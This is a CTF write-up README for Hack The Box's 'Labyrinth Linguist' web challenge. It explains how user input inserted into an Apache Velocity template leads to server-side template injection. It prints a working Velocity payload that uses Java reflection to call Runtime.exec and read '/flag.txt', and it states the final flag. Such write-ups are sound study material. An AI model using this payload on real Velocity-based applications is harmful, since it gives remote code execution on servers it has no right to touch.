# Labyrinth Linguist

## Overview

This directory contains the local materials and manual walkthrough for the `Labyrinth Linguist` challenge on Hack The Box - CTF Try Out. The archived notes identify it as a `Easy` challenge. This README is written as a practical walkthrough so someone can open the folder, inspect the challenge files, understand the intended weakness, and reproduce the solve with commands that are easy to copy and run.

## Challenge Profile

- Challenge: `Labyrinth Linguist`
- Category: `Web`
- Platform: `Hack The Box - CTF Try Out`
- Difficulty: `Easy`

## Directory Contents

- `Dockerfile`
- `build-docker.sh`
- `challenge/`
- `config/`
- `entrypoint.sh`
- `flag.txt`
- `labyrinth_linguist_poc.sh`
- `web_labyrinth_linguist.zip`

## First Commands To Run

Start with the original challenge materials in this folder. Treat this like a proper writeup: inspect what was provided, identify the relevant clue or weakness, verify it with the commands below, and continue until you can see or submit the final flag manually.

```bash
cd "/home/eliah/Desktop/CTF/HackTheBox/Labyrinth_Linguist"
ls -lah
unzip -l "web_labyrinth_linguist.zip"
```

Useful first inspection commands:

```bash
sed -n '1,220p' 'Dockerfile'
sed -n '1,220p' 'build-docker.sh'
sed -n '1,220p' 'entrypoint.sh'
sed -n '1,220p' 'flag.txt'
file 'web_labyrinth_linguist.zip'
strings -n 5 'web_labyrinth_linguist.zip' | head -200
```

## Writeup Flow

This README follows a public-writeup style structure: start from the provided files or exposed service, confirm the key weakness or clue with manual commands, use that confirmed finding to move forward, and stop only when the final flag or recovered result is visible.

When you work through it, keep asking four questions:

1. What is the challenge giving me locally or remotely?
2. What exact behavior, bug, artifact, or hidden assumption matters?
3. How do I verify that with a command or inspection step?
4. How does that verified result lead to the final flag?

## Walkthrough

Challenge: Labyrinth Linguist
Platform: Hack The Box - CTF Try Out
Category: Web
Difficulty: Easy

### Scenario summary

The application looks like a harmless "english to voxalith" translator, but the
backend is not actually translating text. Instead, it reads an HTML template file,
replaces the literal placeholder string TEXT with our input, and then feeds the
resulting page into Apache Velocity for template parsing.

Why that matters:
If user-controlled input is inserted into a server-side template before the engine
parses it, then the user is no longer just sending text. The user is sending code
in that template language.

In this challenge:
- The backend is Java / Spring.
- The template engine is Apache Velocity.
- Our input is inserted directly into the template body.
- That gives us Velocity SSTI.

### Relevant vulnerable logic from Main.java

line = line.replace("TEXT", replacement);
...
t.setData(runtimeServices.parse(reader, "home"));
t.merge(context, writer);

So the execution order is:
1. Read template file.
2. Replace TEXT with attacker-controlled input.
3. Parse and execute the modified template.

That means a payload like:
#set($x=7*7)$x
becomes active Velocity code and renders 49.

Real-world analogy:
Think of it like a CMS that lets users customize a page, but instead of storing the
text safely, it pastes that text straight into a server-side template compiler.
At that point, the "content" field becomes a programming interface.

Exploit strategy:
1. Confirm SSTI with a simple Velocity expression.
2. Use Java reflection from Velocity to reach java.lang.Runtime.
3. Run `cat /flag.txt`.
4. Capture command output with java.util.Scanner and print it into the page.

Why reflection is used:
Velocity gives us object and method access, but no direct shell helper.
Since Java strings expose .class / .getClass(), we can reach Class.forName(),
load Runtime, call getRuntime(), and then exec().

Payload core:
#set($x='')
#set($rt=$x.class.forName('java.lang.Runtime').getRuntime())
#set($p=$rt.exec('cat /flag.txt'))
#set($sc=$x.class.forName('java.util.Scanner')
.getConstructor($x.class.forName('java.io.InputStream'))
.newInstance($p.getInputStream())
.useDelimiter('\\A'))
$sc.next()

Notes on the Scanner trick:
- Runtime.exec() gives back a Process.
- Process.getInputStream() exposes command stdout.
- Scanner(...).useDelimiter('\\A') reads the whole stream as one token.
- next() then returns the full command output as a single string.

Usage:

Final flag recovered on this instance:
HTB{f13ry_t3mpl4t35_fr0m_th3_d3pth5!!_b28a4e5618d3b6f7e34ddc500f9f19fa}

## Manual Reproduction Flow

Use the walkthrough above as the authoritative solve path. The short command block below is only the setup phase before you execute the numbered manual steps in this README.

```bash
cd "/home/eliah/Desktop/CTF/HackTheBox/Labyrinth_Linguist"
ls -lah
```

## Final Flag

Following the manual path in this README leads to: `HTB{f13ry_t3mpl4t35_fr0m_th3_d3pth5!!_b28a4e5618d3b6f7e34ddc500f9f19fa}`

## Study Notes

This challenge is worth revisiting if you are practicing `Web` problems. Inspect the routes and source manually first, confirm the weakness yourself, and only then compare your reasoning against the archived solve notes.
